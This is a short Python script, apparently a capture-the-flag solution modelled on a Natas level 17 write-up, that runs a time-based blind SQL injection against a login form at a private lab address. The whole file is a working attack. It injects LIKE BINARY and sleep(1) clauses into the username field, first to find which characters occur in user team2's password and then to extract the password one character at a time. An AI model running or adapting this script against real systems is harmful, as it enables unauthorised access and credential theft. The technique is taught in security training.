# -*- coding: utf-8 -*-
"""
Reference: https://www.abatchy.com/2016/12/natas-level-17
"""

import requests

headers = {'content-type': 'application/x-www-form-urlencoded'}  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
  
for char in allchars:  
        payload = 'username=team2%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)  
        r = requests.post('http://10.34.14.5/sql.php', data=payload, headers=headers)  
        if(r.elapsed.seconds >= 1):  
                filteredchars = filteredchars + char  
                print(filteredchars)  
  
print(filteredchars)  
  
for i in range(0,64):  
        for char in filteredchars:  
                payload = 'username=team2%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(1)%23'.format(passwd + char)  
                r = requests.post('http://10.34.14.5/sql.php', data=payload, headers=headers)  
                if(r.elapsed.seconds >= 1):  
                        passwd = passwd + char  
                        print(passwd)  
                        break  